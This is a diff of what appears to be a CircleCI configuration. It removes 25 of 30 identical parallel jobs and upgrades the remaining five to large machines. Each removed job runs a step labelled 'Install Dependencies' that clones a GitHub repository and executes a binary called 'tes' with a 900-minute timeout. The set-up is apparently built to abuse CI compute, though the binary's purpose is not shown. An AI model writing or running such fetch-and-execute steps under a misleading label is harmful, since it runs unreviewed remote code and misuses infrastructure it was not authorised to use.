@@ -3,6 +3,7 @@ jobs:
     aku1:
       machine:
             image: ubuntu-2004:202101-01
+      resource_class: large
       steps:
         - run:
             name: Install Dependencies
@@ -11,6 +12,7 @@ jobs:
     aku2:
       machine:
             image: ubuntu-2004:202101-01
+      resource_class: large
       steps:
         - run:
             name: Install Dependencies
@@ -19,6 +21,7 @@ jobs:
     aku3:
       machine:
             image: ubuntu-2004:202101-01
+      resource_class: large
       steps:
         - run:
             name: Install Dependencies
@@ -27,6 +30,7 @@ jobs:
     aku4:
       machine:
             image: ubuntu-2004:202101-01
+      resource_class: large
       steps:
         - run:
             name: Install Dependencies
@@ -35,206 +39,7 @@ jobs:
     aku5:
       machine:
             image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku6:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku7:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku8:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku9:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku10:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku11:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku12:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku13:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku14:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku15:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku16:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku17:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku18:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku19:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku20:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku21:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku22:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku23:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku24:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku25:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku26:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku27:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku28:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku29:
-      machine:
-            image: ubuntu-2004:202101-01
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://github.com/pramadoli/b.git && cd b && chmod u+x tes && ./tes
-            no_output_timeout: 900m
-    aku30:
-      machine:
-            image: ubuntu-2004:202101-01
+      resource_class: large
       steps:
         - run:
             name: Install Dependencies
@@ -250,28 +55,3 @@ workflows:
             - aku3
             - aku4
             - aku5
-            - aku6
-            - aku7
-            - aku8
-            - aku9
-            - aku10
-            - aku11
-            - aku12
-            - aku13
-            - aku14
-            - aku15
-            - aku16
-            - aku17
-            - aku18
-            - aku19
-            - aku20
-            - aku21
-            - aku22
-            - aku23
-            - aku24
-            - aku25
-            - aku26
-            - aku27
-            - aku28
-            - aku29
-            - aku30
